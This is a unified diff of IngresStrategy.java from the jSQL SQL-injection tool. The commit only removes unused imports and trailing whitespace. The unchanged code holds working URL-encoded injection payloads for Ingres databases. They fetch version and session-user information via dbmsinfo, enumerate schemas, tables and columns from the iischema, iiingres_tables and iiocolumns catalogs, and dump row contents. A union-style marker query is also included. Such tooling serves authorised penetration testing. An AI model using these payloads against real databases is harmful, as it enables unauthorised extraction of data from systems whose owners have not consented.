@@ -1,12 +1,10 @@
 package com.jsql.model.vendor;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 import com.jsql.model.bean.Database;
 import com.jsql.model.bean.Table;
-import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
@@ -14,13 +12,13 @@ public class IngresStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "SELECT+dbmsinfo('_version')||'{%}'||dbmsinfo('database')||'{%}'||dbmsinfo('session_user')||'{%}'||dbmsinfo('session_user')||0x01030307+r";
     }
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'%050%04'rr+" +
             "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
             "where+t.schema_name>=t1.schema_name+" +
@@ -29,7 +27,7 @@ public class IngresStrategy extends ASQLStrategy {
 
     @Override
     public String getTableList(Database database) {
-        return 
+        return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'%050%04'rr+" +
             "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
             "where+t.table_name>=t1.table_name+" +
@@ -38,7 +36,7 @@ public class IngresStrategy extends ASQLStrategy {
 
     @Override
     public String getColumnList(Table table) {
-        return 
+        return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'%050%04'rr+" +
             "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
             "where+t.column_name>=t1.column_name+" +
@@ -52,7 +50,7 @@ public class IngresStrategy extends ASQLStrategy {
         formatListColumn = formatListColumn.replace("{%}", "),''))||0x7f||trim(ifnull(varchar(");
         formatListColumn = "trim(ifnull(varchar(" + formatListColumn + "),''))";
 
-        return 
+        return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'%050%04'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
             "where+t.s>=t1.s+" +
@@ -67,7 +65,7 @@ public class IngresStrategy extends ASQLStrategy {
 
     @Override
     public String performanceQuery(String[] indexes) {
-        return 
+        return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
